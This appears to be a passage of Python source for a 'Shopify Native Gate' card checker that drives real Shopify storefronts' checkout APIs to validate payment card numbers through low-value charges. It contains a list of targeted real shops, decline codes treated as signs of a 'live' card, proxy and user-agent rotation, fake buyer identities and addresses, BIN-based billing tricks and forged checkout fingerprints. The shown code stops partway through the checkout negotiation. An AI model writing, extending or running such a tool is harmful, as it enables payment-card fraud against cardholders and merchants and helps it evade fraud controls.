"""
Shopify Native Gate - Optimized for real bank results
- Low price product sites ($0.50-$5) to minimize charge amount
- Parallel site checking for speed
- Real bank response parsing
- Better AVS/billing matching
"""
import aiohttp
import asyncio
import json
import re
import time
import random
import string
import logging
import os
import uuid
import hashlib
from urllib.parse import urlparse, parse_qs, unquote

logger = logging.getLogger(__name__)

PROXY_FILE = os.path.join(os.path.dirname(os.path.dirname(__file__)), "proxy.txt")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"

LIVE_DECLINE_CODES = {
    "insufficient_funds", "do_not_honor", "generic_decline",
    "lost_card", "stolen_card", "pickup_card",
    "restricted_card", "not_permitted", "security_violation",
    "incorrect_cvc", "incorrect_zip",
    "card_velocity_exceeded", "withdrawal_count_limit_exceeded",
    "transaction_not_allowed", "try_again_later",
    "card_not_supported", "currency_not_supported",
    "duplicate_transaction", "reenter_transaction",
    "fraudulent", "merchant_blacklist",
    "issuer_not_available", "processing_error",
    "approve_with_id", "call_issuer",
}

# Sites with LOW PRICE products ($1-$12) for minimal charge
# Tested and verified working with products.json
SHOPIFY_SITES = [
    # $0.01-$5 (cheapest)
    "www.rarebeauty.com",            # $0.01
    "www.olehenriksen.com",          # $1.00
    "www.fentybeauty.com",           # $1.50
    "shopmissa.com",                 # $1.55
    "dayspring-pens.myshopify.com",  # $1.99
    "brokeallday.myshopify.com",     # $2.50
    "boatcarpetbuys.myshopify.com",  # $2.99
    "aloracosmetics.myshopify.com",  # $4.99
    "www.wetnwildbeauty.com",        # $5.10
    # $6-$12 (low price)
    "www.anastasiabeverlyhills.com", # $6.00
    "bulletmole1.myshopify.com",     # $6.50
    "www.puravidabracelets.com",     # $8.00
    "www.glowrecipe.com",            # $10.00
    "biggerfive.myshopify.com",      # $10.99
    "www.revlon.com",                # $10.99
    "cubitt-official.myshopify.com", # $11.95
    "better-boat.myshopify.com",     # $11.99
    # $13-$25 (medium price - still good for checking)
    "desert-does-it.myshopify.com",  # $12.99
    "dose-of-colors.myshopify.com",  # $13.00
    "www.brooklinen.com",            # $14.75
    "coyotevest.myshopify.com",      # $14.95
    "1x2r9x-2w.myshopify.com",       # $15.00
    "www.deadstock.ca",              # $20.00
    "www.skims.com",                 # $20.00
    "www.loveyourmelon.com",         # $20.00
    "bosideng-fashion.myshopify.com",# $22.00
    "www.stevemadden.com",           # $24.00
    "www.hauslabs.com",              # $24.00
    "www.teeinblue.com",             # $24.99
    "www.kyliecosmetics.com",        # $25.00
    "www.maccosmetics.com",          # $25.00
    # $28-$50 (higher but working)
    "camprageous.myshopify.com",     # $28.00
    "couch-collectibles.myshopify.com", # $29.95
    "biaggi-1.myshopify.com",        # $29.99
    "canisathlete.myshopify.com",    # $30.00
    "www.jennikayne.com",            # $30.00
    "www.kosas.com",                 # $32.00
    "www.tarte.com",                 # $32.00
    "www.morphe.com",                # $35.00
    "www.glossier.com",              # $42.00
    "brendagrands.myshopify.com",    # $45.00
    "cove-home-8002.myshopify.com",  # $47.00
    "colourpop.com",                 # $49.00
    # $50+ (working but higher charge)
    "www.summerfridays.com",         # $52.00
    "www.everlane.com",              # $59.00
    "conner-hats.myshopify.com",     # $77.00
    "negativeunderwear.com",         # $78.00
    "helmboots.com",                 # $79.00
    "www.outdoorvoices.com",         # $98.00
    "carbon-38.myshopify.com",       # $108.00
    "www.kizik.com",                 # $139.95
    "www.mejuri.com",                # $198.00
    "www.danielwellington.com",      # $199.00
    "bychari.myshopify.com",         # $200.00
    "dapper-lighting.myshopify.com", # $219.99
    # More small Shopify stores (high chance of Shopify Payments = real bank results)
    "www.puravidabracelets.com",     # $8.00
    "www.rarebeauty.com",            # $0.01
    "www.fentybeauty.com",           # $1.50
    "www.anastasiabeverlyhills.com", # $6.00
    "www.glowrecipe.com",            # $10.00
    "www.revlon.com",                # $10.99
    "www.brooklinen.com",            # $14.75
    "www.skims.com",                 # $20.00
    "www.loveyourmelon.com",         # $20.00
    "www.stevemadden.com",           # $24.00
    "www.hauslabs.com",              # $24.00
    "www.kyliecosmetics.com",        # $25.00
    "www.maccosmetics.com",          # $25.00
    "www.kosas.com",                 # $32.00
    "www.tarte.com",                 # $32.00
    "www.morphe.com",                # $35.00
    "www.glossier.com",              # $42.00
    "colourpop.com",                 # $49.00
]

FAKE_GATEWAYS = {"bogus", "test", "fake", "debug", "manual"}

UNSUPPORTED_SITES = [
    "barnesandnoble.com",
    "shop.barnesandnoble.com",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Edg/138.0.0.0",
]

def _get_ua():
    return random.choice(USER_AGENTS)

PROPOSAL_QUERY = 'query Proposal($sessionInput:SessionTokenInput!,$queueToken:String,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties},queueToken:$queueToken}){__typename result{__typename ...on NegotiationResultAvailable{queueToken sellerProposal{runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode}}}}...on PendingTerms{__typename}}delivery{__typename ...on PendingTerms{__typename}...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle amount{...on MoneyValueConstraint{value{amount currencyCode}}}}}}}}payment{...on FilledPaymentTerms{availablePaymentLines{paymentMethod{__typename ...on PaymentProvider{paymentMethodIdentifier name}}}}}}}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken __typename}...on NegotiationResultFailed{__typename}}errors{code localizedMessage}}}}'

SUBMIT_QUERY = 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields analytics:$analytics){__typename ...on SubmitSuccess{receipt{...ReceiptDetails}}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails}}...on SubmitFailed{reason}...on SubmitRejected{errors{__typename ...on NegotiationError{code localizedMessage}...on InputValidationError{field}}}...on Throttled{pollAfter queueToken}...on CheckpointDenied{redirectUrl}...on SubmittedForCompletion{receipt{...ReceiptDetails}}}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}'

POLL_QUERY = 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id}...on ProcessingReceipt{id pollDelay}...on WaitingReceipt{id pollDelay}...on ActionRequiredReceipt{id}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated}}}}}'


def _extract_between(text, start, end):
    try:
        s = text.index(start) + len(start)
        e = text.index(end, s)
        return text[s:e]
    except ValueError:
        return None


def _generate_script_fingerprint():
    sig_uuid = str(uuid.uuid4())
    seed = f"{sig_uuid}{time.time()}{random.random()}"
    signature = hashlib.sha256(seed.encode()).hexdigest()[:40]
    return {
        'signature': signature,
        'signatureUuid': sig_uuid,
        'lineItemScriptChanges': [],
        'paymentScriptChanges': [],
        'shippingScriptChanges': [],
    }


def _checkout_graphql_headers(domain, checkout_url):
    source_id = hashlib.md5(f"{domain}{random.random()}".encode()).hexdigest()
    return {
        'User-Agent': _get_ua(),
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/json',
        'Origin': f'https://{domain}',
        'Referer': checkout_url,
        'sec-ch-ua': '"Google Chrome";v="138", "Chromium";v="138", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'x-checkout-web-source-id': source_id,
    }


def _random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    num = ''.join(random.choices(string.digits, k=3))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    return f"{name}{num}@{random.choice(domains)}"


def _random_name():
    firsts = ["John", "James", "Robert", "Michael", "William", "David", "Richard", "Joseph",
              "Daniel", "Matthew", "Andrew", "Christopher"]
    lasts = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Taylor", "Wilson", "Davies",
             "Anderson", "Thomas", "Jackson", "White"]
    return random.choice(firsts), random.choice(lasts)


ADDRESSES = [
    {'street': '1600 Pennsylvania Ave NW', 'city': 'Washington', 'state': 'DC', 'zip': '20500', 'phone': '2025551234'},
    {'street': '350 Fifth Ave', 'city': 'New York', 'state': 'NY', 'zip': '10118', 'phone': '2125551234'},
    {'street': '233 S Wacker Dr', 'city': 'Chicago', 'state': 'IL', 'zip': '60606', 'phone': '3125551234'},
    {'street': '6060 Center Dr', 'city': 'Los Angeles', 'state': 'CA', 'zip': '90045', 'phone': '3235551234'},
    {'street': '1000 Main St', 'city': 'Houston', 'state': 'TX', 'zip': '77002', 'phone': '7135551234'},
    {'street': '1234 Market St', 'city': 'Philadelphia', 'state': 'PA', 'zip': '19107', 'phone': '2155551234'},
    {'street': '500 Boylston St', 'city': 'Boston', 'state': 'MA', 'zip': '02116', 'phone': '6175551234'},
    {'street': '700 Pike St', 'city': 'Seattle', 'state': 'WA', 'zip': '98101', 'phone': '2065551234'},
    {'street': '225 Bush St', 'city': 'San Francisco', 'state': 'CA', 'zip': '94104', 'phone': '4155551234'},
    {'street': '4040 Spencer St', 'city': 'Las Vegas', 'state': 'NV', 'zip': '89119', 'phone': '7025551234'},
    {'street': '200 E Randolph St', 'city': 'Chicago', 'state': 'IL', 'zip': '60601', 'phone': '3125559876'},
    {'street': '859 Spring St', 'city': 'Atlanta', 'state': 'GA', 'zip': '30308', 'phone': '4045551234'},
    {'street': '600 Congress Ave', 'city': 'Austin', 'state': 'TX', 'zip': '78701', 'phone': '5125551234'},
    {'street': '50 S Main St', 'city': 'Salt Lake City', 'state': 'UT', 'zip': '84144', 'phone': '8015551234'},
    {'street': '925 W Peachtree St', 'city': 'Atlanta', 'state': 'GA', 'zip': '30309', 'phone': '4045559876'},
]

US_BANK_BINS = [
    "514377", "431935", "510875", "474440", "455673",
    "414720", "517805", "438863", "529143", "455326",
    "546210", "438857", "549123", "451421", "540478",
]

US_BILLING_ADDRESSES = [
    {'street': '742 Evergreen Terrace', 'city': 'Springfield', 'state': 'IL', 'zip': '62701', 'phone': '2175551234'},
    {'street': '221B Baker Street', 'city': 'New York', 'state': 'NY', 'zip': '10001', 'phone': '2125559876'},
    {'street': '1313 Mockingbird Lane', 'city': 'Dallas', 'state': 'TX', 'zip': '75201', 'phone': '2145554321'},
    {'street': '12 Grimmauld Place', 'city': 'Chicago', 'state': 'IL', 'zip': '60601', 'phone': '3125557890'},
    {'street': '42 Wallaby Way', 'city': 'Sydney', 'state': 'FL', 'zip': '32801', 'phone': '4075552468'},
]


def _random_address():
    return random.choice(ADDRESSES)


def _is_us_bank_bin(cc):
    bin_prefix = str(cc)[:6]
    return bin_prefix in US_BANK_BINS


def _random_us_billing():
    return random.choice(US_BILLING_ADDRESSES)


def _is_fake_gateway(gw_name):
    gw_lower = (gw_name or "").lower()
    for fake in FAKE_GATEWAYS:
        if fake in gw_lower:
            return True
    return False


def _is_skip_response(amount, response):
    skip = (
        "No session token", "Site requires login", "No products available",
        "No shipping available", "Domain not found", "SSL error", "Connection timeout",
        "Site is password protected", "Product unavailable", "Checkout page timeout",
        "Negotiation failed", "Checkpoint Denied", "Site uses new checkout",
        "Payment method unavailable", "Failed to add to cart", "Failed to create checkout",
        "Total changed", "Throttled",
    )
    for s in skip:
        if s.lower() in (response or "").lower():
            return True
    return False


def _parse_bank_response(text):
    resp = {
        'response_code': '',
        'avs_code': '',
        'cvv_code': '',
        'transaction_id': '',
    }
    try:
        data = json.loads(text)
        receipt = data.get('data', {}).get('receipt', {})
        pe = receipt.get('processingError', {})
        resp['response_code'] = pe.get('code', '')
        resp['transaction_id'] = receipt.get('id', '')
        if 'avsResultCode' in pe:
            resp['avs_code'] = pe.get('avsResultCode', '')
        if 'cvvResultCode' in pe:
            resp['cvv_code'] = pe.get('cvvResultCode', '')
    except Exception:
        pass
    return resp


def _get_proxy():
    try:
        if os.path.exists(PROXY_FILE):
            with open(PROXY_FILE, "r") as f:
                lines = [l.strip() for l in f if l.strip()]
            if lines:
                raw = random.choice(lines)
                parts = raw.split(":")
                if len(parts) == 4:
                    host, port, user, pwd = parts
                    return f"http://{user}:{pwd}@{host}:{port}"
                elif len(parts) == 2:
                    return f"http://{parts[0]}:{parts[1]}"
    except Exception:
        pass
    return None


async def _negotiate(session, graphql_url, headers, variables):
    max_retries = 3
    for attempt in range(max_retries):
        try:
            resp = await session.post(graphql_url, json={'query': PROPOSAL_QUERY, 'variables': variables, 'operationName': 'Proposal'}, headers=headers, timeout=aiohttp.ClientTimeout(total=8))
            data = await resp.json(content_type=None)
            negotiate = data.get('data', {}).get('session', {}).get('negotiate', {})
            if not negotiate or not isinstance(negotiate, dict):
                continue
            # The negotiate response wraps the actual result:
            # negotiate = { __typename: "Negotiate", result: { __typename: "NegotiationResultAvailable", queueToken, sellerProposal, ... }, errors }
            # Return the inner `result` object so callers can access __typename/sellerProposal/queueToken directly
            result = negotiate.get('result', {})
            if not result or not isinstance(result, dict):
                # Some responses may put the result fields at the top level
                result = negotiate
            return result
        except Exception:
            if attempt < max_retries - 1:
                await asyncio.sleep(0.3)
                continue
            return {'__typename': 'NegotiationResultFailed'}


async def _fetch_products(session, domain):
    url = f"https://{domain}/products.json"
    headers = {
        'User-Agent': _get_ua(),
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'no-cache',
    }
    try:
        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
            if resp.status == 429:
                await asyncio.sleep(1)
                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp2:
                    if resp2.status != 200:
                        return None
                    data = await resp2.json(content_type=None)
                return _parse_products(data)
            if resp.status in (401, 403, 404):
                return None
            if resp.status != 200:
                return None
            data = await resp.json(content_type=None)
            return _parse_products(data)
    except Exception:
        return None


def _parse_products(data):
    products = data.get('products', [])
    if not products:
        return None
    # Find the CHEAPEST available product under $10 (for minimal charge)
    min_price = float('inf')
    best = None
    for product in products:
        for variant in product.get('variants', []):
            if not variant.get('available', False):
                continue
            try:
                price = float(str(variant.get('price', '0')).replace(',', ''))
                if 0 < price < min_price:
                    min_price = price
                    best = {
                        'price': f"{price:.2f}",
                        'variant_id': str(variant['id']),
                        'handle': product['handle'],
                    }
            except (ValueError, TypeError):
                continue
    # Fallback to any available product if no cheap one found
    if not best:
        for product in products:
            for variant in product.get('variants', []):
                if variant.get('available', False):
                    try:
                        price = float(str(variant.get('price', '0')).replace(',', ''))
                        best = {
                            'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'handle': product['handle'],
                        }
                    except (ValueError, TypeError):
                        continue
    return best


def _extract_session_token(text):
    sst = _extract_between(text, 'name="serialized-sessionToken" content="&quot;', '&q')
    if not sst:
        sst = _extract_between(text, 'name="serialized-session-token" content="&quot;', '&q')
    return sst


def _parse_seller(seller):
    if not seller or not isinstance(seller, dict):
        return '0', 'USD', '0', None, '', '0', None, None
    try:
        running_total = seller.get('runningTotal', {}).get('value', {}).get('amount', '0')
    except Exception:
        running_total = '0'
    try:
        currency = seller.get('runningTotal', {}).get('value', {}).get('currencyCode', 'USD')
    except Exception:
        currency = 'USD'

    tax_data = seller.get('tax', {})
    tax_amount = '0'
    if isinstance(tax_data, dict) and 'totalTaxAmount' in tax_data:
        try:
            tax_amount = tax_data['totalTaxAmount'].get('value', {}).get('amount', '0')
        except Exception:
            tax_amount = '0'

    delivery_data = seller.get('delivery', {})
    delivery_strategy = ''
    shipping_amount = '0'
    if isinstance(delivery_data, dict) and delivery_data.get('__typename') == 'FilledDeliveryTerms':
        lines = delivery_data.get('deliveryLines', [])
        strategies = lines[0].get('availableDeliveryStrategies', []) if lines else []
        if strategies:
            delivery_strategy = strategies[0].get('handle', '')
            shipping_amount = strategies[0].get('amount', {}).get('value', {}).get('amount', '0')

    payment_method_id = None
    gateway_name = None
    payment_data = seller.get('payment', {})
    if isinstance(payment_data, dict) and payment_data.get('__typename') == 'FilledPaymentTerms':
        payment_lines = payment_data.get('availablePaymentLines', [])
        if payment_lines:
            pm = payment_lines[0].get('paymentMethod', {})
            payment_method_id = pm.get('paymentMethodIdentifier')
            gateway_name = pm.get('name')

    del_type = delivery_data.get('__typename') if isinstance(delivery_data, dict) else None
    return running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, payment_method_id, gateway_name


async def _shopify_check(session, domain, cc, mm, yy, cvv, progress_cb=None):
    domain = domain.replace('https://', '').replace('http://', '').strip('/')
    base_url = f"https://{domain}"
    gateway_display_name = 'Shopify Payments'
    UA = _get_ua()

    for unsupported in UNSUPPORTED_SITES:
        if unsupported in domain:
            return None, "Site uses new checkout (incompatible)", gateway_display_name, None

    async def _progress(msg):
        if progress_cb:
            try:
                await progress_cb(msg)
            except Exception:
                pass

    headers = {
        'User-Agent': UA,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/json',
        'sec-ch-ua': '"Google Chrome";v="138", "Chromium";v="138", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'X-Requested-With': 'XMLHttpRequest',
        'DNT': '1',
    }

    # Find cheapest product - try collections endpoint FIRST (less likely to be blocked)
    await _progress(f"Finding product on {domain}...")
    product = None
    for endpoint in [
        f"{base_url}/collections/all/products.json?limit=10",
        f"{base_url}/products.json?limit=10",
        f"{base_url}/collections/all/products.json?limit=5",
        f"{base_url}/products.json?limit=5&page=1",
        f"{base_url}/collections/frontpage/products.json?limit=10",
    ]:
        try:
            async with session.get(endpoint, headers={
                'User-Agent': UA, 'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.9',
            }, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                if resp.status == 429:
                    await asyncio.sleep(0.5)
                    continue
                if resp.status in (401, 403, 404):
                    continue
                if resp.status == 200:
                    data = await resp.json(content_type=None)
                    product = _parse_products(data)
                    if product:
                        break
        except Exception:
            continue
    if not product:
        try:
            product = await _fetch_products(session, domain)
        except Exception:
            pass
    if not product:
        return None, "No products available", gateway_display_name, None

    variant_id = product['variant_id']
    subtotal_price = product['price']

    first, last = _random_name()
    email = _random_email()
    addr = _random_address()
    street = addr['street']
    city = addr['city']
    state = addr['state']
    s_zip = addr['zip']
    phone = addr['phone']

    is_us_bank = _is_us_bank_bin(cc)
    if is_us_bank:
        billing = _random_us_billing()
        bill_street = billing['street']
        bill_city = billing['city']
        bill_state = billing['state']
        bill_zip = billing['zip']
        bill_phone = billing['phone']
    else:
        bill_street = street
        bill_city = city
        bill_state = state
        bill_zip = s_zip
        bill_phone = phone

    # Add to cart
    await _progress("Adding to cart...")
    try:
        cart_resp = await session.post(f"{base_url}/cart/add.js", json={'id': variant_id}, headers=headers, timeout=aiohttp.ClientTimeout(total=6))
        if cart_resp.status == 422:
            return None, "Product unavailable", gateway_display_name, None
        if cart_resp.status != 200:
            return None, f"Failed to add to cart (HTTP {cart_resp.status})", gateway_display_name, None
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        return None, f"Failed to add to cart: {str(e)[:50]}", gateway_display_name, None

    # Create checkout
    await _progress("Creating checkout...")
    checkout_headers = {
        'User-Agent': UA,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'sec-ch-ua': '"Google Chrome";v="138", "Chromium";v="138", "Not_A Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    }
    try:
        resp = await session.post(f"{base_url}/checkout/", headers=checkout_headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8))
        checkout_url = str(resp.url)
        try:
            post_text = await resp.text()
        except Exception:
            post_text = ""
    except (aiohttp.ClientError, asyncio.TimeoutError) as e:
        return None, f"Failed to create checkout: {str(e)[:50]}", gateway_display_name, None

    if 'login' in checkout_url.lower():
        return None, "Site requires login", gateway_display_name, None
    if 'password' in checkout_url.lower():
        return None, "Site is password protected", gateway_display_name, None

    if 'shop.app' in checkout_url.lower():
        parsed = urlparse(checkout_url)
        qs = parse_qs(parsed.query)
        back_url = qs.get('ur_back_url', [''])[0]
        if back_url:
            back_url = unquote(back_url)
            checkout_url = back_url
            try:
                resp = await session.get(checkout_url, headers=headers, timeout=aiohttp.ClientTimeout(total=6))
                text = await resp.text()
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return None, "Checkout page timeout", gateway_display_name, None
        else:
            return None, "Shop Pay redirect without back URL", gateway_display_name, None
    else:
        text = post_text
        if not text or 'serialized-sessionToken' not in text:
            try:
                resp = await session.get(checkout_url, headers=checkout_headers, timeout=aiohttp.ClientTimeout(total=6))
                text = await resp.text()
            except (aiohttp.ClientError, asyncio.TimeoutError):
                return None, "Checkout page timeout", gateway_display_name, None

    sst = _extract_session_token(text)
    if not sst:
        checkout_token_match = re.search(r'/checkouts/cn/([^/]+)', checkout_url)
        if checkout_token_match:
            try:
                orig_url = checkout_url.split('?')[0]
                await asyncio.sleep(0.3)
                resp = await session.get(orig_url, headers=checkout_headers, timeout=aiohttp.ClientTimeout(total=6))
                text = await resp.text()
                sst = _extract_session_token(text)
            except Exception:
                pass
    if not sst:
        return None, "No session token", gateway_display_name, None

    queue_token = _extract_between(text, 'queueToken&quot;:&quot;', '&q')
    stable_id = _extract_between(text, 'stableId&quot;:&quot;', '&q')

    pattern = r'currencycode\s*[:=]\s*["\']?([^"\']+)["\']?'
    currency_match = re.search(pattern, text.lower())
    currency = currency_match.group(1).upper() if currency_match else 'USD'

    payment_method_id = _extract_between(text, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')

    graphql_url = f"https://{urlparse(base_url).netloc}/checkouts/unstable/graphql"
    headers = _checkout_graphql_headers(domain, checkout_url)

    addr_block = {
        'address1': street, 'address2': '', 'city': city,
        'countryCode': 'US', 'postalCode': s_zip, 'firstName': first,
        'lastName': last, 'zoneCode': state, 'phone': phone, 'company': '',
    }

    billing_addr_block = {
        'address1': bill_street, 'address2': '', 'city': bill_city,
        'countryCode': 'US', 'postalCode': bill_zip, 'firstName': first,
        'lastName': last, 'zoneCode': bill_state, 'phone': bill_phone, 'company': '',
    }

    merch_block = {
        'stableId': stable_id,
        'merchandise': {
            'productVariantReference': {
                'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None,
            },
        },
        'quantity': {'items': {'value': 1}},
        'expectedTotalPrice': {'value': {'amount': subtotal_price, 'currencyCode': currency}},
        'lineComponentsSource': None, 'lineComponents': [],
    }

    common_vars = {
        'sessionInput': {'sessionToken': sst},
        'queueToken': queue_token,
        'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
        'merchandise': {'merchandiseLines': [merch_block]},
        'buyerIdentity': {
            'customer': {'presentmentCurrency': currency, 'countryCode': 'US'},
            'email': email, 'emailChanged': False, 'phoneCountryCode': 'US',
            'marketingConsent': [{'email': {'value': email}}],
            'shopPayOptInPhone': {'countryCode': 'US'}, 'rememberMe': False,
        },
        'tip': {'tipLines': []},
        'taxes': {
            'proposedAllocations': None,
            'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
            'proposedTotalIncludedAmount': None, 'proposedMixedStateTotalAmount': None,
            'proposedExemptions': [],
        },
        'note': {'message': None, 'customAttributes': []},
        'localizationExtension': {'fields': []},
        'nonNegotiableTerms': None,
        'scriptFingerprint': _generate_script_fingerprint(),
        'optionalDuties': {'buyerRefusesDuties': False},
    }

    latest_qt = [queue_token]

    def _make_vars():
        v = {**common_vars}
        v['queueToken'] = latest_qt[0]
        return v

    def _update_qt(result):
        if not result or not isinstance(result, dict):
            return
        qt = result.get('queueToken')
        if qt:
            latest_qt[0] = qt

    # Setup shipping
    await _progress("Setting up shipping...")
    try:
        step1_vars = _make_vars()
        step1_vars['delivery'] = {
            'deliveryLines': [{
                'destination': {'partialStreetAddress': addr_block},
                'selectedDeliveryStrategy': {
                    'deliveryStrategyMatchingConditions': {
                        'estimatedTimeInTransit': {'any': True}, 'shipments': {'any': True},
                    },
                    'options': {},
                },
                'targetMerchandiseLines': {'any': True},
                'deliveryMethodTypes': ['SHIPPING'],
                'expectedTotalPrice': {'any': True},
                'destinationChanged': True,
            }],
            'noDeliveryRequired': [], 'useProgressiveRates': False,
            'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
        }
        step1_vars['payment'] = {
            'totalAmount': {'any': True}, 'paymentLines': [],
            'billingAddress': {'streetAddress': {
                'address1': '', 'city': '', 'countryCode': 'US',
                'lastName': '', 'zoneCode': '', 'phone': '',
            }},
        }

        r = await _negotiate(session, graphql_url, headers, step1_vars)
        _update_qt(r)
        await asyncio.sleep(0.1)
        step1_vars['queueToken'] = latest_qt[0]
        result1 = await _negotiate(session, graphql_url, headers, step1_vars)
        _update_qt(result1)

        if not result1 or not isinstance(result1, dict):
            return None, "Negotiate error: no response", gateway_display_name, None
        if result1.get('__typename') == 'CheckpointDenied':
            return None, "Checkpoint Denied - Skipping", gateway_display_name, None
        if result1.get('__typename') == 'NegotiationResultFailed':
            return None, "Negotiation failed", gateway_display_name, None
        if result1.get('__typename') != 'NegotiationResultAvailable':
            return None, f"Negotiation failed: {result1.get('__typename', 'Unknown')}", gateway_display_name, None

        sp1 = result1.get('sellerProposal')
        if not sp1 or not isinstance(sp1, dict):
            return None, "No seller proposal", gateway_display_name, None
        running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw_name = _parse_seller(sp1)
        if api_pmi and not payment_method_id:
            payment_method_id = api_pmi
        gateway_display_name = api_gw_name or 'Shopify Payments'

        if del_type == 'PendingTerms':
            await asyncio.sleep(0.1)
            step1_vars['queueToken'] = latest_qt[0]
            result1b = await _negotiate(session, graphql_url, headers, step1_vars)
            _update_qt(result1b)
            if result1b and isinstance(result1b, dict) and result1b.get('__typename') == 'NegotiationResultAvailable':
                sp1b = result1b.get('sellerProposal')
                if sp1b and isinstance(sp1b, dict):
                    running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw_name = _parse_seller(sp1b)
                    if api_pmi and not payment_method_id:
                        payment_method_id = api_pmi
                    if api_gw_name:
                        gateway_display_name = api_gw_name

        if not delivery_strategy:
            return None, "No shipping available", gateway_display_name, None

        def _build_selected_delivery():
            return {
                'deliveryLines': [{
                    'destination': {'streetAddress': addr_block},
                    'selectedDeliveryStrategy': {
                        'deliveryStrategyMatchingConditions': {
                            'estimatedTimeInTransit': {'any': True},
                            'shipments': {'any': True},
                        },
                        'options': {'phone': phone},
                    },
                    'targetMerchandiseLines': {'any': True},
                    'deliveryMethodTypes': ['SHIPPING'],
                    'expectedTotalPrice': {'any': True},
                    'destinationChanged': False,
                }],
                'noDeliveryRequired': [], 'useProgressiveRates': False,
                'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
            }

        step2_vars = _make_vars()
        step2_vars['delivery'] = _build_selected_delivery()
        step2_vars['payment'] = {
            'totalAmount': {'any': True}, 'paymentLines': [],
            'billingAddress': {'streetAddress': addr_block},
        }

        result2 = await _negotiate(session, graphql_url, headers, step2_vars)
        _update_qt(result2)
